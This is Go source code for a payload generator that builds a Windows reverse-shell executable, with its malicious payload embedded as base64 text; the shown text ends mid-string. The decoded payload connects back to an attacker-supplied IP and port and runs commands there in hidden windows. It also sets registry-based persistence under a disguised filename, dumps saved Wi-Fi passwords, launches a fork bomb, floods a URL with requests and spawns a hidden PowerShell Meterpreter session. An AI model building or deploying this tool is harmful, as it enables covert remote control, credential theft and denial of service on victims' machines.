package main



import "strings"
import "fmt"
import "os"
import "runtime"
import "io/ioutil"
import "os/exec"
import "path/filepath"
import "encoding/base64"
import "github.com/fatih/color"



var ARG string
var PAYLOAD string
var PAYLOAD_TYPE string = "Windows"
var PERSISTENCE bool
var DISPATCH bool = false
var ARC string = "386" 
var LINKER string = "static"





func main() { // 192.168.1.1 8888 -p windows -a x86 -l static 


  CheckGolang()


  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
  ARGS := os.Args[1:]



  if len(ARGS) == 0 {
    color.Yellow(HELP)
    os.Exit(1)
  }

  if len(ARGS[0]) < 7 || len(ARGS[0]) > 15 {
    color.Red("\n[-] ERROR : Invalid IP !")
    os.Exit(1)
  }

  if len(ARGS[1]) < 1 || len(ARGS[1]) > 5 {
    color.Red("\n[-] ERROR : Invalid Port !")
    os.Exit(1)
  }

  for i := 0; i < len(ARGS); i++ {
    if i == 0 {
      ARG = ARGS[i]
    }else{
      ARG = (ARG +" "+ ARGS[i])
    }
  }

  if strings.Contains(ARG, "-a x86") || strings.Contains(ARG, "-A X86") || strings.Contains(ARG, "-A x86") || strings.Contains(ARG, "-a X86") {
    ARC = "386"
  }else if strings.Contains(ARG, "-a x64") || strings.Contains(ARG, "-A X64") || strings.Contains(ARG, "-a X64") || strings.Contains(ARG, "-A x64") {
    ARC = "amd64"
  }else if strings.Contains(ARG, "-a") || strings.Contains(ARG, "-A") {
    color.Red("\n[-] ERROR : Invalid Architecture !")
    os.Exit(1)
  }

 if  strings.Contains(ARG, "-l static") || strings.Contains(ARG, "-L STATIC") || strings.Contains(ARG, "-l STATIC") || strings.Contains(ARG, "-L static") {
  LINKER =  "static"
 }else if strings.Contains(ARG, "-l dynamic") || strings.Contains(ARG, "-L DYNAMIC") || strings.Contains(ARG, "-l DYNAMIC") || strings.Contains(ARG, "-L dynamic") {
  LINKER = "dynamic"
 }else if strings.Contains(ARG, "-l") {
  color.Red("\n[-] ERROR : Invalid Linker !")
  os.Exit(1)
 }




  if strings.Contains(ARG, "-p windows") || strings.Contains(ARG, "-P WINDOWS") || strings.Contains(ARG, "-p Windows") || strings.Contains(ARG, "-P windows") || strings.Contains(ARG, "-p WINDOWS") || strings.Contains(ARG, "-P Windows") {
    WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    PAYLOAD = string(WINDOWS_PAYLOAD)
    PAYLOAD_TYPE = "Windows"
  }else if strings.Contains(ARG, "-p linux") || strings.Contains(ARG, "-P LINUX") || strings.Contains(ARG, "-p Linux") || strings.Contains(ARG, "-P linux") || strings.Contains(ARG, "-p LINUX") || strings.Contains(ARG, "-P Linux") {
    LINUX_PAYLOAD, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
    PAYLOAD = string(LINUX_PAYLOAD)
    PAYLOAD_TYPE = "Linux"
  }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
    color.Red("\n[-] ERROR : Invalid Payload !")
    os.Exit(1)
  }else {
    PAYLOAD_TYPE = "Windows"
  	WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    PAYLOAD = string(WINDOWS_PAYLOAD)
  }


  if strings.Contains(ARG, "--persistence") || strings.Contains(ARG, "--PERSISTENCE") || strings.Contains(ARG, "--Persistence") {
    PERSISTENCE = true
  }else{
    PERSISTENCE = false
  }




  if strings.Contains(ARG, "--embed=") || strings.Contains(ARG, "--Embed=") || strings.Contains(ARG, "--EMBED=") {
    DISPATCH = true;
  }else{
    DISPATCH = false;
  }






//####################################################################### PARAMETER CHECKS ##############################################################//





  if DISPATCH == true {
    FileName := strings.Split(ARG, "=");

    File, err := ioutil.ReadFile(FileName[1])
    if err != nil {
      ErrorMessage := string("[!] Unable to acces "+FileName[1])
      color.Red(ErrorMessage)
    }else{
      EncodedFile := base64.StdEncoding.EncodeToString(File)
      GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(PAYLOAD), ARC, LINKER, PERSISTENCE,EncodedFile,FileName[1])
    }

  }else{
  	GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(PAYLOAD), ARC, LINKER, PERSISTENCE,"","")
  }
  

  color.Blue("\n\n[*] Payload : "+PAYLOAD_TYPE)
  color.Blue("\n[*] Architecture : "+ARC)
  color.Blue("\n[*] Linker : "+LINKER)
  if PERSISTENCE == true {
    color.Blue("\n[*] Persistence : Enabled")  
  }else{
    color.Blue("\n[*] Persistence : Disabled")
  }

  if DISPATCH == true {
    FileName := strings.Split(ARG, "=");
    Info := string("\n[*] File Embeding : Payload merged with "+FileName[1])
    color.Blue(Info)
    Info = string("\n\n[+] Payload generated as Payload_" + FileName[1] + " at "+dir)
    color.Green(Info)
  }else{
    color.Blue("\n[*] File Embeding : Disabled")
    color.Green(string("\n\n[+] Payload generated as Payload.exe at "+dir))
  }
  
   
}


func GENERATE_PAYLOAD(IP string, PORT string, PAYLOAD string, ARC string, LINKER string, PERSISTENCE bool, ENCODED_FILE string, ENCODED_FILENAME string) {

  IP = string("\""+IP+"\";")
  PORT = string("\""+PORT+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(PAYLOAD, "\"127.0.0.1\";", IP, -1)
  Index = strings.Replace(Index, "\"8552\";", PORT, -1)

  if PERSISTENCE == true {
    Index = strings.Replace(Index, "BACKDOOR bool = false;", "BACKDOOR bool = true;", -1)
  }

  if DISPATCH == true  {
    Index = strings.Replace(Index, "EMBEDDED bool = false;", "EMBEDDED bool = true;", -1)
    Index = strings.Replace(Index, "//INSERT-BINARY-HERE//", string(ENCODED_FILE), -1)
  }


  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    if LINKER == "static" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui\" Payload.go ")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui -s\" Payload.go ")
    }


    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    } 
    Builder.WriteString(LINKER)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()

    if DISPATCH == true {
      Temp := string("rename Payload.exe Payload_"+ENCODED_FILENAME)
      exec.Command("cmd", "/C", Temp).Run()
    }

  }else if runtime.GOOS != "windows" {

    if LINKER == "static" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }

    exec.Command("sh", "-c", LINKER).Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
    if DISPATCH == true {
      Temp := string("rename Payload_Payload.exe "+ENCODED_FILENAME)
      exec.Command("sh", "-c", Temp).Run()
    }
  }
}




var WINDOWS_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKaW1wb3J0ICJuZXQiOwppbXBvcnQgIm9zL2V4ZWMiOwppbXBvcnQgImJ1ZmlvIjsgCmltcG9ydCAib3MiOwppbXBvcnQgInN0cmluZ3MiOwppbXBvcnQgInBhdGgvZmlsZXBhdGgiOwppbXBvcnQgInN5c2NhbGwiOwppbXBvcnQgIm5ldC9odHRwIjsKaW1wb3J0ICJ0aW1lIjsKaW1wb3J0ICJieXRlcyI7CmltcG9ydCAiY29tcHJlc3MvZmxhdGUiOwppbXBvcnQgImVuY29kaW5nL2Jhc2U2NCI7CgoKCmNvbnN0IElQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBQT1JUIHN0cmluZyA9ICI4NTUyIjsKY29uc3QgQkFDS0RPT1IgYm9vbCA9IGZhbHNlOwpjb25zdCBFTUJFRERFRCBib29sID0gZmFsc2U7CmNvbnN0IFRJTUVfREVMQVkgdGltZS5EdXJhdGlvbiA9IDU7Ly9TZWNvbmQKCgoKdmFyIEdMT0JBTF9DT01NQU5EIHN0cmluZzsKdmFyIERPU19UYXJnZXQgc3RyaW5nOwp2YXIgRE9TX1JlcXVlc3RfQ291bnRlciBpbnQgPSAwOwp2YXIgRE9TX1JlcXVlc3RfTGltaXQgaW50ID0gMTAwMDsKCnZhciBJUF9QT1JUIHN0cmluZzsgLy8gRk9SIE1FVEVSUFJFVEVSCgpmdW5jIG1haW4oKSB7CgogIGlmIEVNQkVEREVEID09IHRydWUgewogICAgRElTUEFUQ0goKQogIH0KCgogIGlmIEJBQ0tET09SID09IHRydWUgewogICAgUEVSU0lTVCgpCiAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIAogIGNvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgSVArIjoiK1BPUlQpOyAgICAgICAgICAgICAgICAgICAgICAgCiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIHRpbWUuU2xlZXAoVElNRV9ERUxBWSp0aW1lLlNlY29uZCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICB9OyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAKICBkaXIsIF8gOj0gZmlsZXBhdGguQWJzKGZpbGVwYXRoLkRpcihvcy5BcmdzWzBdKSk7ICAgICAKICBWZXJzaW9uX0NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgInZlciIpOwogIFZlcnNpb25fQ2hlY2suU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICB2ZXJzaW9uLCBfIDo9IFZlcnNpb25fQ2hlY2suT3V0cHV0KCk7ICAgICAgICAgICAKICBTeXNHdWlkZSA6PSAoQkFOTkVSK3N0cmluZyh2ZXJzaW9uKSArICJcblxuIiArIHN0cmluZyhkaXIpICsgIj4iKTsgICAgICAKICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoU3lzR3VpZGUpKSk7ICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogCiAgCiAgZm9yIHsKICAgIAogICAgQ29tbWFuZCwgXyA6PSBidWZpby5OZXdSZWFkZXIoY29ubmVjdCkuUmVhZFN0cmluZygnXG4nKTsgICAgICAgICAgICAgICAgICAgICAgIAogICAgX0NvbW1hbmQgOj0gc3RyaW5nKENvbW1hbmQpOyAgICAgICAgICAgICAgICAgICAgICAKICAgIEdMT0JBTF9DT01NQU5EID0gX0NvbW1hbmQ7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIAoKICAgIAogICAgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5wbGVhc2UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiflBMRUFTRSIpIHsgCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKFNBWV9QTEVBU0UoKSkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5NRVRFUlBSRVRFUiAtQSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+TWV0ZXJwcmV0ZXIgLWEiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifm1ldGVycHJldGVyIC1hIikgewogICAgICBUZW1wX0lQX1BPUlQgOj0gc3RyaW5ncy5TcGxpdChfQ29tbWFuZCwgIlwiIikKICAgICAgSVBfUE9SVCA9IHN0cmluZyhUZW1wX0lQX1BPUlRbMV0pCiAgICAgIE1FVEVSUFJFVEVSX0NSRUFURSgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsrXSBNZXRlcnByZXRlciBFeGVjdXRlZCAhXG5cbiIrZGlyKyI+IikpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRPUyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZG9zIikgewogICAgICBET1NfQ29tbWFuZCA6PSBzdHJpbmdzLlNwbGl0KEdMT0JBTF9DT01NQU5ELCAiXCIiKQogICAgICBET1NfVGFyZ2V0ID0gIERPU19Db21tYW5kWzFdCiAgICAgIGlmIHN0cmluZ3MuQ29udGFpbnMoc3RyaW5nKERPU19UYXJnZXQpLCAiaHR0cCIpIHsKICAgICAgICBnbyBET1MoKTsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsqXSBTdGFydGluZyBET1MgYXRhY2suLi4iKyJcblxuWypdIFNlbmRpbmcgMTAwMCByZXF1ZXN0IHRvICIrRE9TX1RhcmdldCsiICFcblxuIitkaXIrIj4iKSk7CiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWy1dIEVSUk9SOiBJbnZhbGlkIHVybCAhXG5cbiIrZGlyKyI+IikpOwogICAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ESVNUUkFDVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZGlzdHJhY3QiKSB7IAogICAgICBESVNUUkFDVCgpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifldJRkktTElTVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+d2lmaS1saXN0IikgeyAKICAgICAgTGlzdCA6PSBHRVRfV0lGSV9ISVNUT1JZKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhMaXN0KSkpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkhFTFAiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmhlbHAiKSB7IAogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoSEVMUCtkaXIrIj4iKSkpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5QRVJTSVNURU5DRSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+cGVyc2lzdGVuY2UiKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICBnbyBQRVJTSVNUKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWypdIEFkZGluZyBwZXJzaXN0ZW5jZSByZWdpc3RyaWVzLi4uXG5bKl0gUGVyc2lzdGVuY2UgQ29tcGxldGVkXG5cbiIrZGlyKyI+IikpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2V7CiAgICAgIGNtZCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIF9Db21tYW5kKTsKICAgICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICAgIG91dCwgXyA6PSBjbWQuT3V0cHV0KCk7CiAgICAgIENvbW1hbmRfT3V0cHV0IDo9IHN0cmluZygiXG5cbiIrc3RyaW5nKG91dCkrIlxuIitzdHJpbmcoZGlyKSsiPiIpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShDb21tYW5kX091dHB1dCkpOwogICAgfTsKICB9Owp9OwoKCgoKCmZ1bmMgUEVSU0lTVCgpIHsKICBQRVJTSVNULCBfIDo9IG9zLkNyZWF0ZSgiUEVSU0lTVC5iYXQiKQoKICBQRVJTSVNULldyaXRlU3RyaW5nKCJta2RpciAlQVBQREFUQSVcXFdpbmRvd3MiKyJcbiIpCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygiY29weSAiICsgb3MuQXJnc1swXSArICIgJUFQUERBVEElXFxXaW5kb3dzXFx3aW5kbGwuZXhlXG4iKQogIFBFUlNJU1QuV3JpdGVTdHJpbmcoIlJFRyBBREQgSEtDVVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxcV2luZG93c1xcd2luZGxsLmV4ZSIpCgogIFBFUlNJU1QuQ2xvc2UoKQoKICBFeGVjIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIlBFUlNJU1QuYmF0Iik7CiAgRXhlYy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWMuUnVuKCk7CiAgQ2xlYW4gOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiZGVsIFBFUlNJU1QuYmF0Iik7CiAgQ2xlYW4uU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBDbGVhbi5SdW4oKTsKCn07CgoKCmZ1bmMgU0FZX1BMRUFTRSgpIChzdHJpbmcpewogIENvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIik7CiAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKCJwb3dlcnNoZWxsLmV4ZSAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIC1WZXJiIFJ1bkFzICIrc3RyaW5nKENvbW1hbmRbMV0pKSk7CiAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoc3RyaW5nKG91dCkpOwogIHJldHVybiBDb21tYW5kX091dHB1dDsKfTsKCgoKCmZ1bmMgRElTVFJBQ1QoKSB7CiAgdmFyIEZvcmtfQm9tYiBzdHJpbmcgPSAiOkFcbnN0YXJ0XG5nb3RvIEEiCiAgRl9Cb21iLCBfIDo9IG9zLkNyZWF0ZSgiRl9Cb21iLmJhdCIpCgogIEZfQm9tYi5Xcml0ZVN0cmluZyhGb3JrX0JvbWIpCgogIEZfQm9tYi5DbG9zZSgpCgogIGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIkZfQm9tYi5iYXQiKS5TdGFydCgpCgp9CgoKZnVuYyBET1MoKSB7CiAgZm9yIHsKICAgIERPU19SZXF1ZXN0X0NvdW50ZXIrKwogICAgcmVzcG9uc2UsIGVyciA6PSBodHRwLkdldChET1NfVGFyZ2V0KTsKICAgIGlmIGVyciAhPSBuaWwgewogICAgICBicmVhazsKICAgIH0KICAgIHJlc3BvbnNlLkJvZHkuQ2xvc2UoKTsKICAgIGlmIERPU19SZXF1ZXN0X0NvdW50ZXIgPCBET1NfUmVxdWVzdF9MaW1pdCB7CiAgICAgIGdvIERPUygpCiAgICB9ZWxzZXsKICAgICAgYnJlYWs7CiAgICB9IAogIH0KfQoKCmZ1bmMgR0VUX1dJRklfSElTVE9SWSgpIChzdHJpbmcpIHsKICBMaXN0IDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIm5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9KiBrZXk9Y2xlYXIiKTsKICBMaXN0LlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgSGlzdG9yeSwgXyA6PSBMaXN0Lk91dHB1dCgpOwoKICByZXR1cm4gc3RyaW5nKEhpc3RvcnkpOwp9CgoKCgoKZnVuYyBNRVRFUlBSRVRFUl9DUkVBVEUoKSB7CgogIHZhciBCdWZmZXIgYnl0ZXMuQnVmZmVyCiAgdmFyIFBvd2Vyc2hlbGxfUmV2ZXJzZV9IdHRwcyBzdHJpbmcgPSBSRVZFUlNFX0hUVFBTX1NIRUxMKHN0cmluZyhJUF9QT1JUKSkKCiAgRmxhdGUsIF8gOj0gZmxhdGUuTmV3V3JpdGVyKCZCdWZmZXIsNikKICBpZiBfLCBlcnIgOj0gRmxhdGUuV3JpdGUoW11ieXRlKFBvd2Vyc2hlbGxfUmV2ZXJzZV9IdHRwcykpOyBlcnIgIT0gbmlsIHsKICAgIHBhbmljKGVycikKICB9CiAgaWYgZXJyIDo9IEZsYXRlLkZsdXNoKCk7IGVyciAhPSBuaWwgewogICAgcGFuaWMoZXJyKQogIH0KICBpZiBlcnIgOj0gRmxhdGUuQ2xvc2UoKTsgZXJyICE9IG5pbCB7CiAgICBwYW5pYyhlcnIpCiAgfQoKICBCdWZmZXJTdHJpbmcgOj0gQnVmZmVyLkJ5dGVzKCkKICBFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlciA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcoW11ieXRlKEJ1ZmZlclN0cmluZykpCgoKICB2YXIgUFNfTWV0ZXJwcmV0ZXIgc3RyaW5nID0gQ1JFQVRFX1BTX01FVEVSUFJFVEVSKEVuY29kZWRDb21wcmVzc2VkQnVmZmVyKQoKICBGaWxlLCBfIDo9IG9zLkNyZWF0ZSgiV2luZGxsLmJhdCIpCiAgRmlsZS5Xcml0ZVN0cmluZyhQU19NZXRlcnByZXRlcikKCiAgRmlsZS5DbG9zZSgpOwoKICBUZW1wQ29tbWFuZCA6PSBzdHJpbmcoIm1vdmUgd2luZGxsLmJhdCAlIisiQVBQREFUQSIrIiUiKQoKICBNb3ZlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgVGVtcENvbW1hbmQpOwogIE1vdmUuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBNb3ZlLlJ1bigpOwoKICBUZW1wQ29tbWFuZF8yIDo9IHN0cmluZygiJSIrIkFQUERBVEEiKyIlIisiXFx3aW5kbGwuYmF0IikKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIFRlbXBDb21tYW5kXzIpOwogIEV4ZWMuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFeGVjLlN0YXJ0KCk7Cgp9CgoKdmFyIEJBTk5FUiBzdHJpbmcgPSBgCiAgICAgICAgICAgICAgICAgIF9fICBfX19fX19fX19fX18gIF9fX19fX19fICBfX19fICAgIF9fX19fX19fX19fCiAgICAgICAgICAgICAgICAgLyAvIC8gLyBfX19fLyBfXyBcLyBfX19fLyAvIC8gLyAvICAgLyBfX19fLyBfX18vCiAgICAgICAgICAgICAgICAvIC9fLyAvIF9fLyAvIC9fLyAvIC8gICAvIC8gLyAvIC8gICAvIF9fLyAgXF9fIFwgCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8gCiAgICAgICAgICAgICAgL18vIC9fL19fX19fL18vIHxffFxfX19fL1xfX19fL19fX19fL19fX19fLy9fX19fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBIRVJDVUxFUyBSRVZFUlNFIFNIRUxMICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKYAoKCgoKdmFyIEhFTFAgc3RyaW5nID0gYAoKICAgICAgICAgICAgICAgICAgX18gIF9fX19fX19fX19fXyAgX19fX19fX18gIF9fX18gICAgX19fX19fX19fX18KICAgICAgICAgICAgICAgICAvIC8gLyAvIF9fX18vIF9fIFwvIF9fX18vIC8gLyAvIC8gICAvIF9fX18vIF9fXy8KICAgICAgICAgICAgICAgIC8gL18vIC8gX18vIC8gL18vIC8gLyAgIC8gLyAvIC8gLyAgIC8gX18vICBcX18gXCAKICAgICAgICAgICAgICAgLyBfXyAgLyAvX19fLyBfLCBfLyAvX19fLyAvXy8gLyAvX19fLyAvX19fIF9fXy8gLyAKICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgp+UEVSU1NJU1RFTkNFICAgICAgICAgICAgICAgICAgICAgSW5zdGFsbHMgYSBwZXJzaXN0ZW5jZSBtb2R1bGUKCn5ESVNUUkFDVCAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlcyBhIGZvcmsgYm9tYiBiYXQgZmlsZSBmb3IgZGlzdHJhY3Rpb24gICAKCn5QTEVBU0UgICJDb21tYW5kIiAgICAgICAgICAgICAgICBBc2tzIHVzZXJzIGNvbWZpcm1hdGlvbiBmb3IgaGlnaGVyIHByaXZpbGlkZ2Ugb3BlcmF0aW9ucwoKfkRPUyAtQSAid3d3LnRhcmdldHNpdGUuY29tIiAgICAgIFN0YXJ0cyBhIGRlbmlhbCBvZiBzZXJ2aWNlIGF0YWNrCgp+V0lGSS1MSVNUIAkJCQkJCSAgICAgICAgICAgIER1bXBzIGFsbCB3aWZpIGhpc3RvcnkgZGF0YSB3aXRoIHBhc3N3b3JkcwoKfk1FVEVSUFJFVEVSIC1BICIxMjcuMC4wLjE6ODg4OCIgIENyZWF0ZXMgYSByZXZlcnNlIGh0dHBzIG1ldGVycHJldGVyIGNvbm5lY3Rpb24gdG8gbWV0YXNwbG9pdCAocmV2ZXJzZV9odHRwcykKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKYAoKCgoKZnVuYyBDUkVBVEVfUFNfTUVURVJQUkVURVIoRW5jb2RlZENvbXByZXNzZWRCdWZmZXIgc3RyaW5nKSAoc3RyaW5nKSB7CiAgCgoKdmFyIFNoZWxsX1RlbXBsYXRlIHN0cmluZyA9IGBAZWNobyBvZmYKaWYgJVBST0NFU1NPUl9BUkNISVRFQ1RVUkUlPT14ODYgKHBvd2Vyc2hlbGwuZXhlIC1Ob1AgLU5vbkkgLVcgSGlkZGVuIC1FeGVjIEJ5cGFzcyAtQ29tbWFuZCAiSW52b2tlLUV4cHJlc3Npb24gJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAoJChOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCQoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0gKCwkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZy